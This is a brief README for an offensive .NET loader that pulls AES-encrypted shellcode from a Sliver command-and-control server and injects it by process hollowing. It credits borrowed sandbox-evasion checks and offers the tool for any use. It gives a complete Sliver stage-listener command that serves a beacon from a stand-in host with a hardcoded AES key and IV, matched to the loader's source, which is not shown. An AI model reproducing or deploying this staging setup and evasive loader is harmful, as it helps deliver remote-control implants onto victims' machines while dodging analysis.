# ProcessHollowEncrypted
A .NET assembly that pulls AES encrypted shellcode from Sliver C2 

Compile as DLL or EXE and use how you want. 

## Using with Sliver

On sliver server enter:

    sliver > stage-listener -p https_beacon -u http://example.com:8080 --aes-encrypt-key 'D(G+KbPeShVmYq3t6v9y$B&E)H@McQfF' --aes-encrypt-iv '8y/B?E(G+KbPeShP'

The encryption details must match inside of Program.cs. 


### Credits

* process hollowing implementation - [https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75](https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75)
* bunch of sandbox checks - [https://github.com/Arvanaghi/CheckPlease/tree/master/C%23](https://github.com/Arvanaghi/CheckPlease/tree/master/C%23)
